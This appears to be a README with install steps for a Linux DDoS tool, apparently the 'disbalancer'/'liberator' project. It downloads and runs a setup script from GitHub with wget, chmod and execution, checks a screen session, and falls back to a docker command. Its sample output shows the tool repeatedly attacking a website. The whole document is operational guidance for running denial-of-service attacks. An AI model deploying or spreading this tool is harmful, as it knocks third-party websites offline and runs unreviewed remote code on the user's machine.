# Linux version autoinstall script
```
1. wget https://raw.githubusercontent.com/disbalancer-project/main/main/scripts/linux-setup.sh  
2. `chmod +x linux-setup.sh`  
3. ./linux-setup.sh
```
> may take some time  

### Check that everythind is ok:  

```
screen -r liberator
```
  
### Output example:  
```
2022-03-19T14:29:59Z	Massive https://website.com/ attacking...
2022-03-19T14:30:02Z	Massive https://website.com/ attacking...
2022-03-19T14:30:05Z	Massive https://website.com/ attacking...
2022-03-19T14:30:08Z	Massive https://website.com/ attacking...
2022-03-19T14:30:11Z	Massive https://website.com/ attacking...
2022-03-19T14:30:14Z	Massive https://website.com/ attacking...
2022-03-19T14:30:17Z	Massive https://website.com/ attacking...
2022-03-19T14:30:20Z	Massive https://website.com/ attacking...
```

### If nothing showed:  
```
screen -S liberator -md docker run disbalancer
```
